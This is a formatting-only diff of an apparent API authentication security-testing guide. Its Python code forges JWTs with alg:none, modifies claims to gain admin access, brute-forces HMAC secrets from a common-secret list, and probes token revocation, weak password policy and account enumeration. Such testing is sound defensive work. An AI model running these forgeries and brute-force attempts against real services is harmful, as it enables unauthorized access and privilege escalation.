@@ -91,8 +91,9 @@ if "WWW-Authenticate" in resp.headers:
         auth_indicators["basic_auth"] = True
 
 # Test 3: Login and examine tokens
-login_resp = requests.post(f"{BASE_URL}/auth/login",
-    json={"username": "testuser@example.com", "password": "TestPass123!"})
+login_resp = requests.post(
+    f"{BASE_URL}/auth/login", json={"username": "testuser@example.com", "password": "TestPass123!"}
+)
 
 if login_resp.status_code == 200:
     login_data = login_resp.json()
@@ -100,7 +101,7 @@ if login_resp.status_code == 200:
     for key in ["token", "access_token", "jwt", "id_token"]:
         if key in login_data:
             token = login_data[key]
-            if token.count('.') == 2:
+            if token.count(".") == 2:
                 auth_indicators["jwt_bearer"] = True
                 print(f"JWT found in response field: {key}")
     # Check for refresh tokens
@@ -113,7 +114,7 @@ if login_resp.status_code == 200:
         if "session" in cookie.name.lower():
             auth_indicators["session_cookie"] = True
 
-print(f"\nAuthentication mechanisms detected: {[k for k,v in auth_indicators.items() if v]}")
+print(f"\nAuthentication mechanisms detected: {[k for k, v in auth_indicators.items() if v]}")
 ```
 
 ### Step 2: Unauthenticated Endpoint Discovery
@@ -162,18 +163,20 @@ import json
 import hmac
 import hashlib
 
+
 def decode_jwt_parts(token):
     """Decode JWT header and payload without verification."""
-    parts = token.split('.')
+    parts = token.split(".")
     if len(parts) != 3:
         return None, None
 
     def pad_base64(s):
-        return s + '=' * (4 - len(s) % 4)
+        return s + "=" * (4 - len(s) % 4)
 
     header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])))
     payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])))
     return header, payload
+
 
 # Analyze the JWT token
 token = login_data.get("access_token", "")
@@ -196,10 +199,11 @@ if "exp" not in payload:
     issues.append("HIGH: No expiration claim (exp) - token never expires")
 else:
     import time
+
     exp_time = payload["exp"]
     ttl = exp_time - time.time()
     if ttl > 86400:
-        issues.append(f"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long")
+        issues.append(f"MEDIUM: Token TTL is {ttl / 3600:.0f} hours - excessively long")
 
 # Check 3: Sensitive data in payload
 sensitive_fields = ["password", "ssn", "credit_card", "secret", "private_key"]
@@ -229,11 +233,10 @@ for issue in issues:
 # Attack 1: Remove signature (alg: none)
 def forge_none_algorithm(token):
     """Create a token with alg:none to bypass signature verification."""
-    parts = token.split('.')
-    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
-    header['alg'] = 'none'
-    new_header = base64.urlsafe_b64encode(
-        json.dumps(header).encode()).decode().rstrip('=')
+    parts = token.split(".")
+    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
+    header["alg"] = "none"
+    new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
     # Variations of the none algorithm
     return [
         f"{new_header}.{parts[1]}.",
@@ -241,46 +244,57 @@ def forge_none_algorithm(token):
         f"{new_header}.{parts[1]}.e30",
     ]
 
+
 # Attack 2: Modify claims without re-signing
 def forge_payload(token, modifications):
     """Modify payload claims and test if server validates signature."""
-    parts = token.split('.')
-    payload = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
-    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+    parts = token.split(".")
+    payload = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
+    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
     payload_data.update(modifications)
-    new_payload = base64.urlsafe_b64encode(
-        json.dumps(payload_data).encode()).decode().rstrip('=')
+    new_payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip("=")
     return f"{parts[0]}.{new_payload}.{parts[2]}"
+
 
 # Attack 3: Brute force weak HMAC secrets
 COMMON_JWT_SECRETS = [
-    "secret", "password", "123456", "jwt_secret", "supersecret",
-    "key", "test", "admin", "changeme", "default",
-    "your-256-bit-secret", "my-secret-key", "jwt-secret",
-    "s3cr3t", "secret123", "mysecretkey", "apisecret",
+    "secret",
+    "password",
+    "123456",
+    "jwt_secret",
+    "supersecret",
+    "key",
+    "test",
+    "admin",
+    "changeme",
+    "default",
+    "your-256-bit-secret",
+    "my-secret-key",
+    "jwt-secret",
+    "s3cr3t",
+    "secret123",
+    "mysecretkey",
+    "apisecret",
 ]
+
 
 def brute_force_jwt_secret(token):
     """Try common secrets against HMAC-signed JWTs."""
-    parts = token.split('.')
-    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
-    if header.get('alg') not in ('HS256', 'HS384', 'HS512'):
+    parts = token.split(".")
+    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
+    if header.get("alg") not in ("HS256", "HS384", "HS512"):
         print("Not an HMAC token, skipping brute force")
         return None
 
     signing_input = f"{parts[0]}.{parts[1]}".encode()
     signature = parts[2]
 
-    hash_func = {
-        'HS256': hashlib.sha256,
-        'HS384': hashlib.sha384,
-        'HS512': hashlib.sha512
-    }[header['alg']]
+    hash_func = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[header["alg"]]
 
     for secret in COMMON_JWT_SECRETS:
-        expected_sig = base64.urlsafe_b64encode(
-            hmac.new(secret.encode(), signing_input, hash_func).digest()
-        ).decode().rstrip('=')
+        expected_sig = (
+            base64.urlsafe_b64encode(hmac.new(secret.encode(), signing_input, hash_func).digest()).decode().rstrip("=")
+        )
         if expected_sig == signature:
             print(f"[CRITICAL] JWT secret found: '{secret}'")
             return secret
@@ -288,18 +302,17 @@ def brute_force_jwt_secret(token):
     print("No common secrets matched - consider using hashcat/john for extended brute force")
     return None
 
+
 # Test all attacks
 none_tokens = forge_none_algorithm(token)
 for none_token in none_tokens:
-    resp = requests.get(f"{BASE_URL}/users/me",
-                       headers={"Authorization": f"Bearer {none_token}"})
+    resp = requests.get(f"{BASE_URL}/users/me", headers={"Authorization": f"Bearer {none_token}"})
     if resp.status_code == 200:
         print(f"[CRITICAL] alg:none bypass successful")
 
 # Test privilege escalation via claim modification
 admin_token = forge_payload(token, {"role": "admin", "is_admin": True})
-resp = requests.get(f"{BASE_URL}/admin/users",
-                   headers={"Authorization": f"Bearer {admin_token}"})
+resp = requests.get(f"{BASE_URL}/admin/users", headers={"Authorization": f"Bearer {admin_token}"})
 if resp.status_code == 200:
     print("[CRITICAL] JWT claim modification accepted without signature validation")
 
@@ -310,13 +323,11 @@ brute_force_jwt_secret(token)
 
 ```python
 # Test 1: Token reuse after logout
-logout_resp = requests.post(f"{BASE_URL}/auth/logout",
-    headers={"Authorization": f"Bearer {token}"})
+logout_resp = requests.post(f"{BASE_URL}/auth/logout", headers={"Authorization": f"Bearer {token}"})
 print(f"Logout: {logout_resp.status_code}")
 
 # Try to use the token after logout
-post_logout_resp = requests.get(f"{BASE_URL}/users/me",
-    headers={"Authorization": f"Bearer {token}"})
+post_logout_resp = requests.get(f"{BASE_URL}/users/me", headers={"Authorization": f"Bearer {token}"})
 if post_logout_resp.status_code == 200:
     print("[HIGH] Token still valid after logout - no server-side revocation")
 
@@ -327,13 +338,11 @@ if post_logout_resp.status_code == 200:
 refresh_token = login_data.get("refresh_token")
 if refresh_token:
     # Use refresh token
-    refresh_resp = requests.post(f"{BASE_URL}/auth/refresh",
-        json={"refresh_token": refresh_token})
+    refresh_resp = requests.post(f"{BASE_URL}/auth/refresh", json={"refresh_token": refresh_token})
     new_tokens = refresh_resp.json()
 
     # Try to reuse the same refresh token (should fail if rotation is implemented)
-    reuse_resp = requests.post(f"{BASE_URL}/auth/refresh",
-        json={"refresh_token": refresh_token})
+    reuse_resp = requests.post(f"{BASE_URL}/auth/refresh", json={"refresh_token": refresh_token})
     if reuse_resp.status_code == 200:
         print("[HIGH] Refresh token reuse allowed - no rotation implemented")
 
@@ -348,19 +357,20 @@ if resp.status_code == 200:
 ```python
 # Test password policy enforcement on registration/change endpoints
 weak_passwords = [
-    "a",           # Too short
-    "password",    # Common password
-    "12345678",    # Numeric only
-    "abcdefgh",    # Alpha only, no complexity
-    "Password1",   # Meets basic complexity but is common
-    "",            # Empty
-    " ",           # Whitespace
+    "a",  # Too short
+    "password",  # Common password
+    "12345678",  # Numeric only
+    "abcdefgh",  # Alpha only, no complexity
+    "Password1",  # Meets basic complexity but is common
+    "",  # Empty
+    " ",  # Whitespace
 ]
 
 for pwd in weak_passwords:
-    resp = requests.post(f"{BASE_URL}/auth/register",
-        json={"email": f"test_{hash(pwd)%9999}@example.com",
-              "password": pwd, "name": "Test User"})
+    resp = requests.post(
+        f"{BASE_URL}/auth/register",
+        json={"email": f"test_{hash(pwd) % 9999}@example.com", "password": pwd, "name": "Test User"},
+    )
     if resp.status_code in (200, 201):
         print(f"[WEAK POLICY] Password accepted: '{pwd}'")
 
@@ -368,10 +378,8 @@ for pwd in weak_passwords:
 valid_email = "testuser@example.com"
 invalid_email = "nonexistent_user_xyz@example.com"
 
-resp_valid = requests.post(f"{BASE_URL}/auth/login",
-    json={"username": valid_email, "password": "wrongpassword"})
-resp_invalid = requests.post(f"{BASE_URL}/auth/login",
-    json={"username": invalid_email, "password": "wrongpassword"})
+resp_valid = requests.post(f"{BASE_URL}/auth/login", json={"username": valid_email, "password": "wrongpassword"})
+resp_invalid = requests.post(f"{BASE_URL}/auth/login", json={"username": invalid_email, "password": "wrongpassword"})
 
 if resp_valid.text != resp_invalid.text or resp_valid.status_code != resp_invalid.status_code:
     print(f"[MEDIUM] Account enumeration possible:")
